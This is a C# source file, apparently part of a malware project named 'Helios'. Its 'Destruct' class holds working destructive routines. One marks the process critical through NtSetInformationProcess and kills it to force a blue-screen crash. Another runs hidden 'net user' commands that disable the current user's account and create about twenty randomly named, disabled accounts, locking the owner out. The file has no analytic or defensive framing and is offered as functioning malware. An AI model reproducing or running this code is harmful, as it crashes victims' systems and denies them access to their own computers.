using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using static Vanara.PInvoke.User32;
using Vanara.PInvoke;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Microsoft.SqlServer.Server;

namespace Helios
{
    public class Destruct
    {
        [DllImport("ntdll.dll")]
        public static extern int NtSetInformationProcess(IntPtr process, int process_class, ref int process_value, int length);

        public static void BSOD()
        {
            Process.EnterDebugMode();
            int status = 1;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));
            Process.GetCurrentProcess().Kill();
        }
        public static void Users()
        {
            int quantidade = 20;
            int tamanho = 6;
            Process.Start(new ProcessStartInfo()
            {
                FileName="cmd.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                Arguments = $"/c net user %username% active:no",
            });
            for(int e = 0; e <= quantidade; e++)
            {
                string name = RandomName(tamanho);
                string senha = RandomName(tamanho);
                
                Process.Start(new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = $"/c net user {name} {senha} /add",
                });
                Process.Start(new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = $"/c net user {name} active:no",
                });
            }
        }
        public static string RandomName(int tamanho)
        {
            const string caracteres = "HELIOSFUCKEDYOURPC";
            StringBuilder namebuilder = new StringBuilder();
            Random rand = new Random();
            for(int i = 1; i <= tamanho; i++)
            {
                namebuilder.Append(caracteres[rand.Next(caracteres.Length)]);
            }
            return namebuilder.ToString();
        }
    }
}
